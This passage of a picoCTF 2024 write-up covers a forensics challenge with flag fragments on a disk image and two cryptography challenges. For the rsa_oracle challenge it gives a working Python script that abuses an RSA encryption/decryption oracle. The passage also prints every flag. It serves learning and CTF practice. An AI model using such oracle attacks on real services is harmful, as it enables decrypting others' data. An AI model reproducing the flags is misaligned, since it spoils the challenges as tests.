![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/203fdaca-537f-42ce-a5d8-5edf3f85948f)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/06b2ecdc-02f2-4f26-a9e8-89a154c9e437)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/addf45a6-3428-4c4f-8b58-10050b9e3345)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/bd99bc7c-d694-4821-b9b4-510aff3bd1eb)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/4b91aa66-6b14-4ddf-91b4-60af7f936d14)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/de0ce342-aa2c-4025-9601-3d34ce5ae0bb)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/de5c8b19-af2e-4943-9a8d-0fe98ce9e286)

We have 2 extended file system, trust me there isn't anything in the first partition, just junks hehe. Lets analyze the 3rd partition

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/cc973af7-88ca-42d4-a827-414abed13667)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/687cfdd9-aaea-4ec9-bd7d-081fec15ae1d)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/101cbcf1-39ca-4881-aeeb-22b7d5b7c379)

In the ```root/``` directory you'll find a ```.ash_history``` file and a ```secret-secrets/``` directory, in the ```secret-secrets/``` directory you'll see 2 empty files and then a bash script ```force-wait.sh```

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b91503c3-7cfb-4861-81fe-196874e26cbc)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9320a82d-ad8a-4440-b998-a64e05b9f337)

We don't need the bash script, we are only interested in those 2 files ```innocuous-file.txt``` and ```its-all-in-the-name```, these files are empty actually or so you thought hehe.

Look at the name of the second file ```its-all-in-the-name```, this means it's making reference to the first file ```innocuous-file.txt```, so instead of searching for ```flag.txt``` or ```picoCTF{```😂, I searched for ```innocuous``` instead

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/434c0fc3-2bb5-4088-a744-c6af6d7de52b)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/d6562b35-5c9d-4479-95aa-e65125eafc3a)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/28039c3b-3b8d-4fd7-ab71-fd829446a63f)

We got 14 hits hehe, check the 4th, 5th and 6th fragment, you'll see something interesting

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/d2780b8d-668f-4ffd-aa0e-fc102cb765bc)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6b19b690-a8a2-4a1c-8c20-c752fc120362)
![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b6a39af5-046e-41d7-b8f6-c051235380c4)

Putting together what we got from the 3 fragments, you should have something like this ```picoCTF{1```, this means the flag was distributed amongst the fragments.

Checking the other fragments should get you the remaining parts of the flag. Easy right??😎

FLAG:- ```picoCTF{1_533_n4m35_80d24b30}```


# Cryptography

## interencdec (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6aaf4d3c-38a6-4944-bffb-c20d4bd5436c)
 
This was actually a very easy one

Download the challenge file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ ls -la
total 12
drwxr-xr-x 2 bl4ck4non bl4ck4non 4096 Mar 25 08:01 .
drwxr-xr-x 3 bl4ck4non bl4ck4non 4096 Mar 25 08:00 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non   73 Mar 25 08:00 enc_flag
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ cat enc_flag          
YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==
```
So we've got a base64 encoded text, lets decode this

command:```echo "YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ echo "YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==" | base64 -d
b'd3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ=='
```
We got another base64 encoded text, lets decode further

command:```echo "d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ echo "d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ==" | base64 -d                        
wpjvJAM{jhlzhy_k3jy9wa3k_86kl32k2}
```
Now we've got a rot cipher, we can decode this using [dcode.fr](https://www.dcode.fr/rot-cipher)

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ea922ef8-6f3a-4b15-80c1-53fe679db01d)

We got our flag

FLAG:- ```picoCTF{caesar_d3cr9pt3d_86de32d2}```

--------------------------------------

## rsa_oracle (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/97dcfbd7-47d1-457f-a703-864d748210fe)

Download the challenge files

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/532eadf0-bbfa-46fd-a502-7bc90713d5ce)

We basically are meant to use that password to decrypt the cipher text. They also provided us an instance of the oracle that was used to encrypt the password

We'll try to recover the password using rsa actually, we can use this python script my teammate wrote

```python
import subprocess
from math import gcd
from warnings import filterwarnings

from Crypto.Util.number import bytes_to_long, long_to_bytes
from pwn import *

def establish_connection():
    io = remote("titan.picoctf.net", 56147)
    context.log_level = 'info'
    filterwarnings("ignore")
    return io

def send_message_and_get_response(io, message):
    io.sendline("E")
    io.sendline(message)
    io.recvuntil("n) ")
    response = int(io.recvline().decode())
    return response

def calculate_n(c1, c2, m1, m2, e):
    k1n = (bytes_to_long(m1) ** e) - c1
    k2n = (bytes_to_long(m2) ** e) - c2
    n = gcd(k1n, k2n)
    return n

def read_encrypted_password():
    with open("password.enc", "r") as fp:
        ct = fp.read()
    return ct

def main():
    io = establish_connection()

    m1 = b'a'
    m2 = b'b'
    e = 65537 

    c1 = send_message_and_get_response(io, m1)
    c2 = send_message_and_get_response(io, m2)

    n = calculate_n(c1, c2, m1, m2, e)
    assert c1 == pow(bytes_to_long(m1), e, n)
    print(f"n: {n}")

    ct = read_encrypted_password()
    pad = n + int(ct)
    print(f"pad: {pad}")

    io.sendline("D")
    io.sendline(str(pad))
    
    io.recvuntil(": ")
    pt = bytes.fromhex(io.recvline().decode().split()[-1])
    print(f"AES Password: {pt}")

if __name__ == "__main__":
    main()
```

The script establishes a connection to the remote server, sends encrypted messages, calculates a value based on the received ciphertexts and plaintexts, reads an encrypted password from a file, calculates a value based on the password and server's responses, sends this value to the server, and retrieves a decrypted AES password.

Lets run the script

![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c56a7218-99fd-46a4-8827-1af1a3b50f4e)

You can see we got the AES password to be ```60f50```.

Nw that we have the password lets decrypt the message . We can use openssl for that

command:```openssl enc -d -aes-256-cbc -in secret.enc -out abeg.data```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ openssl enc -d -aes-256-cbc -in secret.enc -out abeg.data 
enter AES-256-CBC decryption password:
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ ls -la                                                   
total 24
drwxr-xr-x 2 bl4ck4non bl4ck4non 4096 Mar 26 14:50 .
drwxr-xr-x 4 bl4ck4non bl4ck4non 4096 Mar 26 14:28 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non   38 Mar 26 14:50 abeg.data
-rw-r--r-- 1 bl4ck4non bl4ck4non 1327 Mar 26 14:46 bankai.py
-rw-r--r-- 1 bl4ck4non bl4ck4non  154 Mar 26 14:29 password.enc
-rw-r--r-- 1 bl4ck4non bl4ck4non   64 Mar 26 14:29 secret.enc
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ file abeg.data    
abeg.data: ASCII text, with no line terminators
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ cat abeg.data  
picoCTF{su((3ss_(r@ck1ng_r3@_60f50766}
```
We got our flag hehe😎

FLAG:- ```picoCTF{su((3ss_(r@ck1ng_r3@_60f50766}```


Till Next Time :xD

























